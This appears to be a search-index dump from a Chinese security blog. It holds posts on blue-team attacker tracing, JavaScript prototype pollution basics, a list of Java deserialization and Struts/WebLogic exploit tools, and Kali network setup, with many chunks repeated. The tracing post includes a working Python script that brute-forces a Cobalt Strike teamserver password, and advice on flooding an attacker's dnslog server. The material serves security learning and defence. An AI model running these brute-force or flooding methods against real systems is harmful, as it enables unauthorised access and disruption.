self.ctx.verify_mode = ssl.CERT_NONE pass def is_connected(self): return self.sock and self.ssl_sock def open(self, hostname, port): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(10) self.ssl_sock = self.ctx.wrap_socket(self.sock) if hostname == socket.gethostname(): ipaddress = socket.gethostbyname_ex(hostname)[2][0] self.ssl_sock.connect((ipaddress, port)) else: self.ssl_sock.connect((hostname, port)) def close(self): if self.sock: self.sock.close() self.sock = None self.ssl_sock = None def send(self, buffer): if not self.ssl_sock: raise NotConnectedException(\"Not connected (SSL Socket is null)\") self.ssl_sock.sendall(buffer) def receive(self): if not self.ssl_sock: raise NotConnectedException(\"Not connected (SSL Socket is null)\") received_size = 0 data_buffer = b\"\" while received_size \u003c 4: data_in = self.ssl_sock.recv() data_buffer = data_buffer + data_in received_size += len(data_in) return data_buffer def passwordcheck(password): if len(password) \u003e 0: result = None conn = Connector() conn.open(args.host, args.port) payload = bytearray(b\"\\x00\\x00\\xbe\\xef\") + len(password).to_bytes(1, \"big\", signed=True) + bytes( bytes(password, \"ascii\").ljust(256, b\"A\")) conn.send(payload) if conn.is_connected(): result = conn.receive() if conn.is_connected(): conn.close() if result == bytearray(b\"\\x00\\x00\\xca\\xfe\"): return password else: return False else: print(\"Ignored blank password\") passwords = [] if args.wordlist: print(\"Wordlist: {}\".format(args.wordlist)) passwords = open(args.wordlist).read().split(\"\\n\") else: print(\"Wordlist: {}\".format(\"stdin\")) for line in sys.stdin: passwords.append(line.rstrip()) if len(passwords) \u003e 0: print(\"Word Count: {}\".format(len(passwords))) print(\"Threads: {}\".format(args.threads)) start = time.time() # https://stackoverflow.com/questions/2846653/how-to-use-threading-in-python attempts = 0 failures = 0 with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor: future_to_check = {executor.submit(passwordcheck, password): password for password in passwords} for future in concurrent.futures.as_completed(future_to_check): password = future_to_check[future] try: data = future.result() attempts = attempts + 1 if data: print(\"Found Password: {}\".format(password)) except Exception as exc: failures = failures + 1 print('%r generated an exception: %s' % (password,","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:8:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#cobalt-strike反制"},{"categories":["hvv"],"content":"\r针对dnslog的反制通过流量设备审计到他人的dnslog平台的url payload,那么针对他的url payload可以进行反制.一般而言,常见的dnslog平台,蓝队防守的时候可以对厂家爱你的dnslog平台进行屏蔽.那么针对自行搭建的dnslog平台有以下思路 dnslog反制,可以批量ping捕获到的dnslog,然后而已扰乱他自行搭建的,恶意制造各种垃圾dnslog数据,让他无法获取到有效的信息,直接让红队人员被迫抛弃一个红队基础设施.具体可以写一个脚本比如站长之家之类的进行批量平,进行探测存活 httplog反制同理,可以使用爬虫节点,批量进行request请求捕获的http url即可,这样红队的dnslog平台几乎彻底报废. ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:9:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#针对dnslog的反制"},{"categories":["hvv"],"content":"\r攻击者画像：\r","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:9:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#攻击者画像"},{"categories":["hvv"],"content":"\r常见红队被反杀的姿势 使用个人工作pc,且浏览器里面保存了百度 163 sina等登录凭据,攻击对抗过程中踩到蓝队的蜜罐,被jsonp劫持漏洞捕获安全社交id,从而被溯源到了真实的姓名和所在公司 可能是蓝队封禁ip太厉害的原因,红队个人或者团队,使用自己的网站进行vps进行扫描,vps上含有团伙组织https证书,或者vps ip绑定的域名跟安全社交id对应,从而被溯源到真实姓名和所在的公司 部分攻击队写的扫描器payload里面含有攻击者的信息,如使用了私有的dnslog 攻击载荷里面含有安全社交id 含有个人博客资源请求等 投递的钓鱼邮件里面的木马样本被蓝队采集,逆向 反控c2c 溯源到个人信息 虚拟机逃逸打到实体机,暴露个人全部真实信息的 以下是狼蛛安全实验室的几篇溯源研究： 溯源专题 |通过PDF文件信息进行攻击溯源 溯源专题 | 通过时间与时区溯源 溯源专题 | 通过lnk样本进行攻击溯源 溯源专题 | 通过压缩文件溯源攻击者信息 溯源专题 | 通过分析样本组合进行溯源 溯源专题 | 通过PE中的“富签名”进行攻击溯源 【参考资料】： 网盾网络安全培训《webshell溯源排查与反制》 CSDN-vlan911《浅谈溯源反制与防溯源》 奇安信攻防社区-《【hvv2022】溯源反制案例学习笔记》 红队基础建设:隐藏你的C2 server - 先知社区 (aliyun.com) https://xz.aliyun.com/t/8385 https://www.secrss.com/articles/27611 防守反制–爆破CS Teamserver 密码 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:9:2","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#常见红队被反杀的姿势"},{"categories":["notes"],"content":"一些JavaScript 原型链污染基础 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:0:0","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#"},{"categories":["notes"],"content":"\r前置基础知识原型链污染攻击也称JavaScript Prototype 污染攻击 Javascript JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。虽然它是作为开发Web页面的脚本语言而出名，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式、声明式、函数式编程范式 —JavaScript 百度百科 NodeJS Node.js发布于2009年5月，由Ryan Dahl开发，是一个基于Chrome V8引擎的JavaScript运行环境，使用了一个事件驱动、非阻塞式I/O模型， 让JavaScript 运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。 —NodeJS 百度百科 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:0","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#前置基础知识"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#javascript数据类型"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#let和var关键字的区别"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#普通变量"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#数组变量"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#字典"},{"categories":["notes"],"content":"\rJavaScript函数在Javascript中，函数使用function关键字来进行声明 function myFunction(){ } //声明一个函数 function myFuntion(a) { } //声明一个带参数的函数 function myFuntion(a) { return a; } //声明一个带返回值的函数 匿名函数 (function(a){ console.log(a); })(123); //直接调用匿名函数 调用fn()即调用了匿名函数的功能，把变量变成函数 var fn = function(){ return \"将匿名函数赋值给变量\"； } 闭包假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域就会被删除，此时这个新建变量也会被删除。 闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量。 例如，不适用额外的全局变量来实现一个计数器 因为add变量指定了函数自我调用的返回值，每次调用值都加1而不是每次都是1 var add=(function(){ var counter = 0; return function () {return counter +=1;} }) ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:2","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#javascript函数"},{"categories":["notes"],"content":"\rJavaScript函数在Javascript中，函数使用function关键字来进行声明 function myFunction(){ } //声明一个函数 function myFuntion(a) { } //声明一个带参数的函数 function myFuntion(a) { return a; } //声明一个带返回值的函数 匿名函数 (function(a){ console.log(a); })(123); //直接调用匿名函数 调用fn()即调用了匿名函数的功能，把变量变成函数 var fn = function(){ return \"将匿名函数赋值给变量\"； } 闭包假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域就会被删除，此时这个新建变量也会被删除。 闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量。 例如，不适用额外的全局变量来实现一个计数器 因为add变量指定了函数自我调用的返回值，每次调用值都加1而不是每次都是1 var add=(function(){ var counter = 0; return function () {return counter +=1;} }) ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:2","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#匿名函数"},{"categories":["notes"],"content":"\rJavaScript函数在Javascript中，函数使用function关键字来进行声明 function myFunction(){ } //声明一个函数 function myFuntion(a) { } //声明一个带参数的函数 function myFuntion(a) { return a; } //声明一个带返回值的函数 匿名函数 (function(a){ console.log(a); })(123); //直接调用匿名函数 调用fn()即调用了匿名函数的功能，把变量变成函数 var fn = function(){ return \"将匿名函数赋值给变量\"； } 闭包假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域就会被删除，此时这个新建变量也会被删除。 闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量。 例如，不适用额外的全局变量来实现一个计数器 因为add变量指定了函数自我调用的返回值，每次调用值都加1而不是每次都是1 var add=(function(){ var counter = 0; return function () {return counter +=1;} }) ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:2","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#闭包"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#javascript类"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#class关键字"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#使用new创建对象"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#往对象添加属性"},{"categories":["notes"],"content":"\rJavaScript类如果定义一个类，需要以定义”构造函数“的方式来定义， function newClass(){ this.test = 1; } var newObj = new newClass(); 如果想添加一些方法，可以在内部使用构造方法 function newClass(){ this.test = 123; this.fn = function(){ return this.test; } } var newObj = new newClass(); newObj.fn(); class关键字可以使用class关键字来创建一个类 如果不定义构造方法，JavaScript会自动添加一个空的构造方法 class ClassName{ constructor(){...} } 使用new创建对象 let testClass = new myClass(\"testtest\"); 往对象添加属性直接使用.属性名即可，例如向testClass添加aaa属性 testClass.aaa = 333; 举个例子JavaScript中，我们以构造函数的方式来定义类： function a() { this.bar = 1 } new a() a函数的内容，就是a类的构造函数，而this.bar就是a类的一个属性。 我们也可以将方法定义在构造函数内部： function a() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new a()).show() 每当我们新建一个a对象，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 如果希望在创建类的时候只创建一次show方法，这时候就需要使用原型（prototype）： function a() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let a = new a() foo.show() 我们可以认为原型prototype是类a的一个属性，而所有用a类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。 我们可以通过a.prototype来访问a类的原型，但a实例化出来的对象，是不能通过prototype访问原型的，需要用__proto__ foo.__proto__ == Foo.prototype ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#举个例子"},{"categories":["notes"],"content":"\r原型链污染原型指的是prototype 如上文，我们使用new创建了一个newClass对象给newObj变量 function newClass(){ this.test = 1; } var newObj = new newClass(); 实际上，newObj变量使用了原型来实现对象的绑定 prototype是newClass类的一个属性，而所有用newClass类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法 也就是说： prototype是newClass类的一个属性 newClass类实例化的对象newObj不能访问prototype，但可以通过.__proto__来访问newClass类的prototype newClass实例化的对象newObj的.__proto__指向newClass类的prototype 关系图如下： ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:0","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#原型链污染"},{"categories":["notes"],"content":"\r原型链污染原理现在已经知道实例化的对象的.__proto__指向类的prototype 那么修改了实例化的对象的.__proto__的内容, 类的prototype内容也会发生相应改变 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#原型链污染原理"},{"categories":["notes"],"content":"\r一个简单利用的例子有一个类a function a() { this.test = 1; } 实例化一个对象obj var obj = new a(); 此时查看ob的内容 修改a类的原型，添加一个属性test1，令其值为123 a.prototype.test1 = 123; 再次查看obj的内容，多了一个test1 访问obj.test1 再实例化一个a的对象 var obj1 = new a(); 访问obj.test1，发现也是123 然后尝试通过obj1的.__proto__属性来修改test1的值 obj1.__proto__.test1 = 124; 此时访问obj.test1，发现也被修改成了124 obj，obj.test1也随之改变 查看a的属性 通过obj1中.__proto__属性添加一个新属性，和上面修改a类的原型的过程也是一样的 添加新属性test2 obj1.__proto__.test2 = 111; 可以发现obj中也出现了新属性test2, 并且a类中也出现了新属性test2 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:2","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#一个简单利用的例子"},{"categories":["notes"],"content":"\r进一步利用先实例化一个字典对象，叫obj，内有key名为test，test的value是123 var obj = {\"test\": 123}; 然后通过obj的.__proto__属性为test重新赋值 obj.__proto__.test = 2; 再实例化一个空字典对象，叫ooo var ooo = {}; 查看ooo的test属性，为2 因为Object类的test属性已经被污染，而对象ooo和obj同属Object类 再看obj的test属性的值，为123 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:3","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#进一步利用"},{"categories":["notes"],"content":"\r查找顺序 所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。 比如： function Father() { this.first_name = 'Donald' this.last_name = 'Trump' } function Son() { this.first_name = 'Melania' } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) Son类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。 总结一下，对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作： 在对象son中寻找last_name 如果找不到，则在son.__proto__中寻找last_name 如果仍然找不到，则继续在son.proto.__proto__中寻找last_name 依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html 比如说此处的obj 利用.__proto__修改值后的test属性在当前对象的test属性下面（也就是在当前对象所绑定的prototype中）， 所以优先读取当前对象下的test属性，即未被修改的值123 而ooo对象由于当前属性中没有test属性，只能从它绑定的prototype中找test对象（或下一级的prototype）， 没找到返回undefined ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:2:4","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#查找顺序"},{"categories":["notes"],"content":"\r【参考资料】PHITHON《深入理解 JavaScript Prototype 污染攻击》 depy《深入理解原型链污染漏洞》 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:3:0","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#参考资料"},{"categories":["exp"],"content":"收集的一部分Java反序列化漏洞exp https://github.com/brianwrf/hackUtils java反序列化利用 https://github.com/GoSecure/break-fast-serial 借助DNS解析来检测Java反序列化漏洞工具 https://github.com/s1kr10s/Apache-Struts-v3 Apache-Struts漏洞利用工具 https://github.com/iBearcat/S2-057 struts2 CVE-2018-11776 漏洞检测工具 https://github.com/Ivan1ee/struts2-057-exp struts2-057利用脚本 https://github.com/theLSA/s2sniper struts2漏洞的检测工具 https://github.com/Lucifer1993/struts-scan 批量检测struts命令执行漏洞 https://github.com/lijiejie/struts2_045_scan Struts2-045漏洞批量扫描工具 https://github.com/riusksk/StrutScan 基于perl的strut2的历史漏洞扫描 https://github.com/Coalfire-Research/java-deserialization-exploits java反序列化漏洞收集 https://github.com/quentinhardy/jndiat weblogic漏洞利用工具 https://github.com/jas502n/CVE-2018-3191 Weblogic CVE-2018-3191远程代码命令执行 https://github.com/pyn3rd/CVE-2018-3245 weblogic cve-2018-2893与cve-2018-3245远程代码命令执行 https://github.com/NickstaDB/BaRMIe 用于Java Remote Method Invocation服务的工具/rmi的枚举与远程命令执行 https://github.com/joaomatosf/jexboss JBoss和其他java序列化漏洞验证和开发工具 https://github.com/frohoff/ysoserial java反序列化利用工具 ","date":"2023-11-17","objectID":"/java_unserialize_exp/:0:0","series":null,"tags":["exp"],"title":"Java反序列化漏洞exp收集","uri":"/java_unserialize_exp/#"},{"categories":["linux"],"content":"kali linux 手动配网 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:0:0","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#"},{"categories":["linux"],"content":"\r0x1VMnet打靶场的时候，方便起见，给kali配了静态 kali是接入互联网且和win7处在统一内网段的主机，这边用的是NAT模式，同时把DHCP服务关掉了 随后进kali手动配置，kali跟linux的通用配置并不一样 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:1:0","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#0x1vmnet"},{"categories":["linux"],"content":"\r0x2kali linux","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:0","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#0x2kali-linux"},{"categories":["linux"],"content":"\r基本配置 nano /etc/network/interfaces (vim或nano只是个人习惯问题，我习惯用nano) 手动添加以下内容： auto eth0 iface eth0 inet static address 192.168.126.111 netmask 255.255.255.0 gateway 192.168.126.1 随后保存重启网络就ok systemctl stop NetworkManager 随后重启网络 systemctl restart NetworkManager (如果不好用的话，重启一下就好了) ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:1","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#基本配置"},{"categories":["linux"],"content":"\r顺便写一下其他网络配置：\r临时IP配置： ifconfig eth0:1 192.168.136.198 这样就可以给Kali Linux系统的eth0的网卡增加一个IP地址（Kali Linux系统允许一个网卡有两个IP地址）了，添加完成后的结果如下所示： 但这种方式仅用于配置临时性的IP地址，当系统重启或者网络服务重启后，我们这样配置的IP地址即失效。 DNS配置： nano /etc/resolv.conf resolv.conf 的关键字主要有四个，分别是： nameserver //定义DNS服务器的IP地址 domain //定义本地域名 search //定义域名的搜索列表 sortlist //对返回的域名进行排序 然后重启网络服务 /etc/init.d/networking restart 看了网上许多师傅的博客，可能是因为版本差异，最后在配dns的resolv.conf文件里的写法可能并太一样，中途就遇到了dns死活不好用的情况，最终吧原来的网卡删了，重新开了个虚拟网卡，开启DHCP，win7和kali的网络就恢复正常了 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:2","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#顺便写一下其他网络配置"},{"categories":["linux"],"content":"\r顺便写一下其他网络配置：\r临时IP配置： ifconfig eth0:1 192.168.136.198 这样就可以给Kali Linux系统的eth0的网卡增加一个IP地址（Kali Linux系统允许一个网卡有两个IP地址）了，添加完成后的结果如下所示： 但这种方式仅用于配置临时性的IP地址，当系统重启或者网络服务重启后，我们这样配置的IP地址即失效。 DNS配置： nano /etc/resolv.conf resolv.conf 的关键字主要有四个，分别是： nameserver //定义DNS服务器的IP地址 domain //定义本地域名 search //定义域名的搜索列表 sortlist //对返回的域名进行排序 然后重启网络服务 /etc/init.d/networking restart 看了网上许多师傅的博客，可能是因为版本差异，最后在配dns的resolv.conf文件里的写法可能并太一样，中途就遇到了dns死活不好用的情况，最终吧原来的网卡删了，重新开了个虚拟网卡，开启DHCP，win7和kali的网络就恢复正常了 ","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:2","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#临时ip配置"},{"categories":["linux"],"content":"\r顺便写一下其他网络配置：\r临时IP配置： ifconfig eth0:1 192.168.136.198 这样就可以给Kali Linux系统的eth0的网卡增加一个IP地址（Kali Linux系统允许一个网卡有两个IP地址）了，添加完成后的结果如下所示： 但这种方式仅用于配置临时性的IP地址，当系统重启或者网络服务重启后，我们这样配置的IP地址即失效。 DNS配置： nano /etc/resolv.conf resolv.conf 的关键字主要有四个，分别是： nameserver //定义DNS服务器的IP地址 domain //定义本地域名 search //定义域名的搜索列表 sortlist //对返回的域名进行排序 然后重启网络服务 /etc/init.d/networking restart 看了网上许多师傅的博客，可能是因为版本差异，最后在配dns的resolv.conf文件里的写法可能并太一样，中途就遇到了dns死活不好用的情况，最终吧原来的网卡删了，重新开了个虚拟网卡，开启DHCP，win7和kali的网络就恢复正常了 